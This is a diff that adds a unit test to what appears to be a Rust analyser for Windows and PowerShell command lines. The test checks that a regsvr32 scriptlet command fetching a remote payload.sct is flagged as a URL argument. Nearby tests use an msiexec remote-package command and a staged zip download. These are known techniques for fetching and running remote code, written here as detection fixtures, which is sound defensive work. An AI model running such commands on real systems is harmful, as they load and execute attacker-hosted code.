@@ -11173,6 +11173,26 @@ $urlzip = "https://ps.example/stage.zip""#,
     }
 
     #[test]
+    fn direct_regsvr32_scriptlet_url_argument_emits_typed_trait() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        let url = "http://regsvr32-direct.example/payload.sct";
+        crate::interp::interpret_line(
+            &format!(r#"regsvr32 /s /n /u /i:{url} scrobj.dll"#),
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::UrlArgument { url: got, .. } if got == url
+            )
+        });
+        assert!(
+            has,
+            "direct regsvr32 scriptlet URL not typed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn msiexec_url_package_argument_emits_typed_trait() {
         let mut env = crate::env::Environment::new(&Config::default());
         let url = "https://msiexec-package.example/setup.msi";
